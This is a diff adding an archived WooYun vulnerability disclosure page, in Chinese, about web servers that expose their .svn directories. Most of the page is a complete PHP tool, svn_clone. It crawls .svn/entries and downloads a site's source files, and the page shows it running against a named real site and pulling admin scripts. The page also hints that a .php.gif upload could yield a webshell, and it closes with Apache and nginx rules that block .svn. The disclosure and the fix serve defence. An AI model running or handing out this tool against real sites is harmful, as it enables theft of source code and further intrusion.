@@ -1,0 +1,312 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		.svn目录未设权限限制的漏洞利用总结  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		.svn目录未设权限限制的漏洞利用总结  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小雨">小雨</a> 
+</li><li>提交时间：		2012-03-25 12:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-03-25：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-03-25：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我是来刷分的。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">有的站点使用.svn来做生产环境版本控制，但是.svn目录没有做访问权限限制，可以通过.svn/entries来遍历文件和目录列表。 为了节约体力，我写了一个php脚本(http://rains.im/?q=node/18)来做这件事，如果*.php.svn-base不被当.php来执行，那么恭喜你，svn中的.php程序源码随你下了，分析源码可能能帮助你发现更多漏洞。 如果.php.svn-base被当成php文件来执行了，可能看到php错误信息(看到真实路径)或内容为空白，那么，同样恭喜你，这个站点有扩展名识别问题，找地方上传xxx.php.gif也许就可以直接得到webshell了。  </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">/usr/local/bin/svn_clone -cvvvu http://www.2.newsmth.net<br />
+<br />
+*** 下载 bbspsttmpl.php 文件<br />
+<br />
+写入 bbspsttmpl.php 到 /data/src/www.2.newsmth.net (4190 bytes)<br />
+<br />
+*** 下载 default-sf.css 文件<br />
+<br />
+写入 default-sf.css 到 /data/src/www.2.newsmth.net (9700 bytes)<br />
+<br />
+*** 下载 www2-admin.php 文件<br />
+<br />
+写入 www2-admin.php 到 /data/src/www.2.newsmth.net (1819 bytes)<br />
+<br />
+*** 下载 bbspst.php 文件<br />
+<br />
+写入 bbspst.php 到 /data/src/www.2.newsmth.net (2716 bytes)<br />
+<br />
+<br />
+<br />
+</p><pre><code>#!/usr/bin/php -q<br />
+&lt;?php<br />
+/**<br />
+ * 本脚本用于下载.svn目录未作权限限制的并且svn版本小于1.7的网站源码.<br />
+ * 请用php5.3+来运行本脚本.想支持更低版本,请自行修改源码.不必通知我.<br />
+ * 作者：小雨@乌云<br />
+ * http://蛋疼.com<br />
+ */<br />
+#错误报告级别,只报告错误<br />
+error_reporting(E_ERROR);<br />
+#要显示错误<br />
+ini_set(&#039;display_errors&#039;,&#039;On&#039;);<br />
+define(&#039;VERSION&#039;, &#039;1.0&#039;);<br />
+ini_set(&#039;user_agent&#039;,&#039;svn_clone(svn_clone v&#039;.VERSION.&#039;; by 小雨@乌云 email:z@zt.vc; http://蛋疼.com)&#039;);<br />
+#缓存目录，最好放在tmpfs上，我没做过缓存期的设置,所以想真正重新抓一次就必须手工删缓存目录<br />
+define(&#039;CACHE_DIR&#039;, &#039;/tmp/cache&#039;);<br />
+#代码要保存到的路径，不同域名会自动分目录存放的<br />
+define(&#039;DATA_DIR&#039;,  &#039;/data/src&#039;);<br />
+#调试信息级别<br />
+define(&#039;NONE&#039;,    0);#无条件报告<br />
+define(&#039;ERROR&#039;,   1);#错误<br />
+define(&#039;WARNING&#039;, 2);#警告<br />
+define(&#039;ALL&#039;,     3);#全部<br />
+define(&#039;EGGACHE&#039;, 4);#蛋疼<br />
+#获取参数<br />
+$opts = getopt(&#039;u:chv&#039;,array(&#039;url:&#039;,&#039;color&#039;,&#039;help&#039;,&#039;verbose&#039;));<br />
+#获取传入的URL地址<br />
+$url = $opts[&#039;url&#039;]?:($opts[&#039;u&#039;]?:null);<br />
+#是否显示帮助<br />
+$help = isset($opts[&#039;h&#039;])+isset($opts[&#039;help&#039;]);<br />
+#是否使用颜色<br />
+define(&#039;USECOLOR&#039;, isset($opts[&#039;c&#039;])+isset($opts[&#039;color&#039;]));<br />
+#调试信息级别,v越多越详细,最多接受3个v, 函数内用，懒得写global,定义成常量吧.<br />
+define(&#039;VERBOSE&#039;, count($opts[&#039;v&#039;])+count($opts[&#039;verbose&#039;]));<br />
+#本程序的名字,额，我不知道这个写法是否兼容别的shell.反正bash下用它判断是没错的<br />
+$cmd = basename($_SERVER[&#039;_&#039;])==&#039;php&#039;?&#039;php &#039;.$_SERVER[&#039;PHP_SELF&#039;]:$_SERVER[&#039;_&#039;];<br />
+if($help or !$url) {<br />
+    die(&quot;Usage:\t$cmd option [url]\n&quot;.<br />
+        &quot;\t-u  --url\turl\t您想要通过svn克隆的网站url\n&quot;.<br />
+        &quot;\t-c  --color\t\t使用控制台色彩输出\n&quot;.<br />
+        &quot;\t-v  --verbose\t\t打印更多的详细信息,v越多越详细\n&quot;.<br />
+        &quot;\t-h  --help\t\t本帮助信息\n&quot;.<br />
+        &quot;Examples:\n&quot;.<br />
+        &quot;\t$cmd -u http://localhost\n&quot;.<br />
+        &quot;\t$cmd -u http://localhost -cvv\n&quot;.<br />
+        &quot;\t$cmd -vu http://localhost\n&quot;.<br />
+        &quot;\t$cmd -cvvu http://localhost\n&quot;.<br />
+        &quot;\t$cmd --url http://localhost --color --verbose --verbose --verbose 有人勤奋到使用这种格式咩?! Orz.\n&quot;<br />
+    );<br />
+}<br />
+<br />
+#我真是蛋疼...写这行干啥呢...<br />
+debug(&quot;蛋疼是一种病,要淡定,不要蛋疼...\n&quot;, EGGACHE); <br />
+svn_clone($url);<br />
+<br />
+<br />
+#本程序的主函数<br />
+function svn_clone($url) {<br />
+    #去除多余的url结尾多余的斜杠<br />
+    $url=trim($url,&#039;/&#039;);<br />
+    $entries_url = $url.&#039;/.svn/entries&#039;;<br />
+    $content = get($entries_url);<br />
+    if(!$content) {<br />
+        return debug(&quot;$url 不是一个合法的svn工作副本!\n&quot;, ERROR);<br />
+    } elseif(strlen($content)&lt;10) {<br />
+        return debug(&quot;某个东西太短了,需要蓝色小药丸么？\n&quot;, ERROR);  <br />
+    }<br />
+    #匹配出entries中的文件和目录名<br />
+    preg_match_all(&#039;/\f\n([^\n]+?)\s(\w+)\s/s&#039;, $content, $m) or debug(&quot;$entries_url 不包含文件或子目录\n&quot;, WARNING);<br />
+    $files = array_combine($m[1], $m[2]);<br />
+    foreach($files as $file=&gt;$type) {<br />
+        if($type==&#039;dir&#039;) {<br />
+            debug(&quot;&gt;&gt;&gt; 进入 $file 目录\n&quot;, ALL);<br />
+            svn_clone($url.&#039;/&#039;.$file); <br />
+            debug(&quot;&lt;&lt;&lt; 退出 $file 目录\n&quot;, ALL);<br />
+        } elseif($type==&#039;file&#039;) {<br />
+            debug(&quot;*** 下载 $file 文件\n&quot;, ALL);<br />
+            fetch($url.&#039;/.svn/text-base/&#039;.$file.&#039;.svn-base&#039;);<br />
+        }<br />
+    }<br />
+}<br />
+<br />
+#抓取并保存<br />
+function fetch($text_base){<br />
+    put($text_base, get($text_base));<br />
+}<br />
+<br />
+#带缓存的抓取<br />
+function get($url) {<br />
+    $file = CACHE_DIR.&#039;/&#039;.chunk_split(substr(md5($url),0,6),2,&#039;/&#039;).urlencode($url);<br />
+    $dir = dirname($file);<br />
+    if(!is_dir($dir)) {<br />
+        mkdir($dir,0777,true);<br />
+    }<br />
+    if(!file_exists($file)) {<br />
+        $content = file_get_contents($url) or debug(&quot;读取 {$url} 内容为空\n&quot;, WARNING);<br />
+        if($content)<br />
+        {<br />
+            file_put_contents($file, $content) or debug(&quot;写入 {$file} 内容为空\n&quot;, WARNING);<br />
+        }<br />
+    } else {<br />
+        $content = file_get_contents($file) or debug(&quot;读缓存 {$file} 内容为空\n&quot;, WARNING);<br />
+    }<br />
+    return $content;<br />
+}<br />
+<br />
+#保存到数据目录<br />
+function put($url, $content=&#039;&#039;)<br />
+{<br />
+    $file = DATA_DIR.substr(strchr($url,&#039;://&#039;),2);<br />
+    $dir  = dirname(dirname(dirname($file)));<br />
+    $file = basename($file,&#039;.svn-base&#039;);<br />
+    #看看你那什么有多长?<br />
+    $len  = strlen($content);<br />
+    if(!is_dir($dir)) {<br />
+        mkdir($dir,0777,true);<br />
+    }<br />
+    debug(&quot;写入 $file 到 $dir ($len bytes)\n&quot;, ALL);<br />
+    file_put_contents($dir.&#039;/&#039;.$file, $content) or debug(&quot;写入 {$file} 内容为空\n&quot;, WARNING);<br />
+}<br />
+<br />
+#打印调试信息<br />
+function debug($msg, $level=0) {<br />
+    #颜色定义 0:灰, 1:红, 2:绿, 3:黄, 4:蓝, 5:粉, 6:青, 7:白<br />
+    static $colors = array(NONE=&gt;0, ERROR=&gt;1, WARNING=&gt;2, ALL=&gt;3, EGGACHE=&gt;4);<br />
+    VERBOSE&gt;=$level &amp;&amp; (USECOLOR?printf(&quot;\033[1;3{$colors[$level]}m$msg\033[m&quot;, $color, $msg):print $msg);<br />
+}</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">svn更新至1.7+ .svn/entries目录就不包含文件目录列表了<br />
+<br />
+apache:<br />
+<br />
+&lt;Directory ~ &quot;\.svn&quot;&gt;<br />
+<br />
+    Order allow,deny<br />
+<br />
+    Deny from all<br />
+<br />
+&lt;/Directory&gt;<br />
+<br />
+nginx:<br />
+<br />
+location ~ /.svn/ {<br />
+<br />
+  deny all;<br />
+<br />
+} </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小雨" title="小雨">小雨</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-05539" title=".svn目录未设权限限制的漏洞利用总结">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="5539";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
